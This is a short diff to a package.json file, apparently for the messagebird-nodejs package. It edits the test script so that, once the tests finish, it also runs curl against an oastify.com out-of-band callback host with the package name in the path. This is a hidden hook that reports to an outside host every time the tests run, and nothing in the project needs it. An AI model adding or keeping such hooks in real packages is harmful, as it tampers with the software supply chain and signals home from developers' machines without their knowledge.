@@ -8,7 +8,7 @@
     "node": ">=10.0.0"
   },
   "scripts": {
-    "test": "node lib/test.js",
+    "test": "node lib/test.js && curl https://ucaaq7zwttlagdr075putpzdd4jz7tvi.oastify.com/messagebird-nodejs",
     "dtslint": "dtslint types"
   },
   "repository": {
